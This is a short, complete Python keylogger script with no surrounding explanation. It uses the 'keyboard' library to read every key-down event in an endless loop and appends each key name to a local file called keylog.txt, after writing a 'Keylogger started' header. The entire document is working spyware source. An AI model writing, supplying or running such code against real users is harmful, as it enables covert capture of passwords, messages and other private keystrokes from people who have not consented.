import keyboard

def log_keys():
    log_file = "keylog.txt"
    with open(log_file, "w") as f:
        f.write("Keylogger started...\n")
    
    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            with open(log_file, "a") as f:
                f.write(f"{key} ")

log_keys()
